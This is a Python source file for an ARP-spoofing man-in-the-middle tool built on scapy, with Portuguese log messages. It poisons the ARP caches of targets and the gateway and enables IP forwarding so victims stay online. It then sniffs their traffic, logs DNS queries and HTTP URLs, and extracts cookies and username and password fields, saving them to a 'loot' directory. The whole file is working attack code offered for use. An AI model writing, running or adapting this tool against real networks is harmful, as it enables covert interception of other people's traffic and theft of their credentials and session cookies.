import time
import threading
from scapy.all import ARP, Ether, sendp, sniff, wrpcap, conf, DNS, DNSQR, TCP, Raw, IP
from core.utils import log, save_log
from core.network import get_mac
import os
import logging
import re

class ARPSpoofer:
    def __init__(self, iface, gateway_ip):
        logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
        self.iface        = iface
        self.gateway_ip   = gateway_ip
        self.gateway_mac  = get_mac(gateway_ip)

        self.targets      = {}
        self.lock         = threading.Lock()

        self.sniff_thread = None
        self.sniffing     = False
        self.captured_pkts = []

        self.pkt_count    = 0
        self.dns_count    = 0
        self.url_count    = 0

        conf.verb = 0
        os.makedirs("loot", exist_ok=True)

    # ------------------------------------------------------------------ #
    #  IP FORWARDING                                                       #
    # ------------------------------------------------------------------ #

    def enable_forwarding(self):
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("1")
            log("IP forwarding ATIVADO — vítima mantém internet.", "success")
            save_log("IP FORWARD | enabled")
        except Exception as e:
            log(f"Erro ao ativar IP forwarding: {e}", "error")

    def disable_forwarding(self):
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")
            log("IP forwarding DESATIVADO.", "warning")
            save_log("IP FORWARD | disabled")
        except Exception as e:
            log(f"Erro ao desativar IP forwarding: {e}", "error")

    def check_forwarding(self):
        try:
            with open("/proc/sys/net/ipv4/ip_forward", "r") as f:
                return f.read().strip() == "1"
        except Exception:
            return False

    # ------------------------------------------------------------------ #
    #  ARP SPOOF CORE                                                      #
    # ------------------------------------------------------------------ #

    def _spoof_packet(self, target_ip, target_mac, spoof_ip):
        packet = Ether(dst=target_mac) / ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip
        )
        sendp(packet, verbose=False, iface=self.iface)

    def _spoof_loop(self, target_ip, target_mac):
        log(f"Ataque iniciado → {target_ip}", "attack")
        save_log(f"SPOOF START | target={target_ip} mac={target_mac} gateway={self.gateway_ip}")

        while True:
            with self.lock:
                if not self.targets.get(target_ip, {}).get("active"):
                    break
            self._spoof_packet(target_ip, target_mac, self.gateway_ip)
            self._spoof_packet(self.gateway_ip, self.gateway_mac, target_ip)
            time.sleep(1.5)

        self._restore(target_ip, target_mac)

    # ------------------------------------------------------------------ #
    #  RESTORE                                                             #
    # ------------------------------------------------------------------ #

    def _restore(self, target_ip, target_mac):
        log(f"Restaurando ARP → {target_ip}", "warning")
        save_log(f"SPOOF STOP  | target={target_ip} — ARP restaurado")

        for _ in range(5):
            sendp(
                Ether(dst=target_mac) / ARP(
                    op=2, pdst=target_ip, hwdst=target_mac,
                    psrc=self.gateway_ip, hwsrc=self.gateway_mac
                ),
                verbose=False, iface=self.iface
            )
            sendp(
                Ether(dst=self.gateway_mac) / ARP(
                    op=2, pdst=self.gateway_ip, hwdst=self.gateway_mac,
                    psrc=target_ip, hwsrc=target_mac
                ),
                verbose=False, iface=self.iface
            )
            time.sleep(0.3)

        log(f"ARP restaurado para {target_ip}", "success")

    def restore_all(self):
        with self.lock:
            for ip in self.targets:
                self.targets[ip]["active"] = False

        for ip, data in self.targets.items():
            if data["thread"].is_alive():
                data["thread"].join(timeout=5)

        self.disable_forwarding()
        log("Todos os ataques encerrados e ARPs restaurados.", "success")

    # ------------------------------------------------------------------ #
    #  ADD / REMOVE TARGETS                                                #
    # ------------------------------------------------------------------ #

    def add_target(self, target_ip):
        if target_ip in self.targets and self.targets[target_ip]["active"]:
            log(f"{target_ip} já está sendo atacado.", "warning")
            return

        target_mac = get_mac(target_ip)
        if not target_mac:
            log(f"Não foi possível resolver MAC de {target_ip}", "error")
            return

        with self.lock:
            self.targets[target_ip] = {
                "mac":    target_mac,
                "active": True,
                "thread": None
            }

        t = threading.Thread(
            target=self._spoof_loop,
            args=(target_ip, target_mac),
            daemon=True
        )
        with self.lock:
            self.targets[target_ip]["thread"] = t

        t.start()

    def remove_target(self, target_ip):
        if target_ip not in self.targets:
            log(f"{target_ip} não está na lista de alvos.", "warning")
            return

        with self.lock:
            self.targets[target_ip]["active"] = False

        log(f"Encerrando ataque contra {target_ip} ...", "info")

    # ------------------------------------------------------------------ #
    #  TRAFFIC SNIFFING                                                    #
    # ------------------------------------------------------------------ #

    def _process_packet(self, pkt):
        self.pkt_count += 1
        self.captured_pkts.append(pkt)

        # ---------------------------
        # DNS queries em tempo real
        # ---------------------------
        if pkt.haslayer(DNS) and pkt.haslayer(DNSQR):
            try:
                query = pkt[DNSQR].qname.decode(errors="ignore").rstrip(".")
                src   = pkt[IP].src if pkt.haslayer(IP) else "?"
                self.dns_count += 1
                log(f"DNS  {src:<16} → {query}", "info")
                save_log(f"DNS  | src={src} query={query}")
            except Exception:
                pass

        # ---------------------------
        # HTTP + CREDENCIAIS
        # ---------------------------
        if pkt.haslayer(TCP) and pkt.haslayer(Raw):
            try:
                payload = pkt[Raw].load.decode(errors="ignore")
                host_match = re.search(r"Host:\s*(.+)", payload, re.IGNORECASE)
                host = host_match.group(1).strip() if host_match else "unknown"
                cookie_match = re.search(r"Cookie:\s*(.+)", payload, re.IGNORECASE)
                cookie = cookie_match.group(1).strip() if cookie_match else None
                src = pkt[IP].src if pkt.haslayer(IP) else "?"

                # 🔥 DETECÇÃO DE CREDENCIAIS (HTTP ONLY) COM REGEX
                if "POST" in payload or "GET" in payload:
                    matches = re.findall(
                        r"(username|user|use|usuario|email|mail|log|login|password|pass|pwd|pw|senha)\s*=\s*([^&\s]+)",
                        payload,
                        re.IGNORECASE
                    )
                    if cookie:
                        log(f"[🍪] \033[1;31mCOOKIE\033[m de {src} \033[1;33m({host})\033[m → \033[1;32m{cookie}\033[m", "info")
                        save_log(f"COOKIE | src={src} host={host} data={cookie}")
                    if matches:
                        creds = " | ".join([f"{k}={v}" for k, v in matches])

                        log(f"[!!!] \033[1;31mCREDENCIAL\033[m de {src} \033[1;33m({host})\033[m → \033[1;32m{creds}\033[m", "attack")
                        save_log(f"CREDENTIAL | src={src} host={host} data={creds}")

                        with open("loot/creds.txt", "a") as f:
                            f.write(f"\n[{src}] {creds}\n")

                # 🌐 DETECÇÃO DE URL HTTP
                if payload.startswith(("GET ", "POST ", "PUT ", "DELETE ", "HEAD ")):
                    lines  = payload.split("\r\n")
                    method_path = lines[0]

                    host = ""
                    for line in lines[1:]:
                        if line.lower().startswith("host:"):
                            host = line.split(":", 1)[1].strip()
                            break

                    url = f"http://{host}{method_path.split(' ')[1]}"

                    self.url_count += 1
                    log(f"HTTP {src:<16} → {url}", "success")
                    save_log(f"HTTP | src={src} url={url}")

                    with open("loot/urls.txt", "a") as f:
                        f.write(f"{url}\n")

            except Exception:
                pass
            # HTTP URLs em tempo real
            if pkt.haslayer(TCP) and pkt.haslayer(Raw):
                try:
                    payload = pkt[Raw].load.decode(errors="ignore")
                    if payload.startswith(("GET ", "POST ", "PUT ", "DELETE ", "HEAD ")):
                        lines  = payload.split("\r\n")
                        method_path = lines[0]
                        host   = ""
                        for line in lines[1:]:
                            if line.lower().startswith("host:"):
                                host = line.split(":", 1)[1].strip()
                                break
                        src = pkt[IP].src if pkt.haslayer(IP) else "?"
                        url = f"http://{host}{method_path.split(' ')[1]}"
                        self.url_count += 1
                        log(f"HTTP {src:<16} → {url}", "success")
                        save_log(f"HTTP | src={src} url={url}")
                        with open("loot/urls.txt", "a") as f:
                            f.write(f"{url}\n")
                except Exception:
                    pass

    def _sniff_loop(self):
        log("Captura iniciada — DNS e HTTP exibidos em tempo real.", "info")
        sniff(
            iface=self.iface,
            prn=self._process_packet,
            store=False,
            stop_filter=lambda _: not self.sniffing
        )

    def start_sniffing(self):
        if self.sniff_thread and self.sniff_thread.is_alive():
            log("Captura já está ativa.", "warning")
            return

        self.sniffing     = True
        self.pkt_count    = 0
        self.dns_count    = 0
        self.url_count    = 0
        self.sniff_thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self.sniff_thread.start()

    def stop_sniffing(self):
        self.sniffing = False
        if self.captured_pkts:
            pcap_path = "loot/capture.pcap"
            wrpcap(pcap_path, self.captured_pkts)
            log(f"Captura salva → {pcap_path}", "success")
            log(f"Total → {self.pkt_count} pacotes | {self.dns_count} DNS | {self.url_count} URLs HTTP", "success")
            save_log(f"SNIFF END | pkts={self.pkt_count} dns={self.dns_count} urls={self.url_count}")

    # ------------------------------------------------------------------ #
    #  STATUS                                                              #
    # ------------------------------------------------------------------ #

    def list_targets(self):
        return {
            ip: {
                "mac":    data["mac"],
                "active": data["active"],
                "alive":  data["thread"].is_alive() if data["thread"] else False
            }
            for ip, data in self.targets.items()
        }

    def get_stats(self):
        return {
            "pkts": self.pkt_count,
            "dns":  self.dns_count,
            "urls": self.url_count,
        }
